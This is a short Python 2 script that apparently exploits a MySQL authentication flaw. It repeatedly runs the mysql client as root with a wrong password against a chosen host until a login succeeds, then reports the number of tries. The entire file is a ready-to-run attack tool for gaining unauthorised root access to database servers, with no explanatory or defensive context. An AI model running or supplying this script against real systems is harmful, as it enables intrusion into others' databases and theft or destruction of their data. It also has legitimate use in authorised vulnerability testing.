#!/usr/bin/env python
import subprocess
import sys

if len(sys.argv) > 1:
    host = sys.argv[1]

else:
    host = "localhost"

mysql = "mysql -u root mysql --password=blah -h %s 2>/dev/null" % (host)

iterations = 0
shell = 0

print "Connecting to host: " + host
print "Connecting with: " + mysql

while iterations < 1000:
    process = subprocess.Popen("%s" % (mysql), shell=True).wait()

    if not process:
        shell = 1
        break

    iterations += 1

    if iterations % 100 == 0:
        print "%s iterations, no hits yet..." % (iterations)

if shell:
    print "Got login after %s iterations." % (iterations)

else:
    print "[!] %s iterations with no shell, quitting. Version is probably not \
          vulnerable." % (iterations)
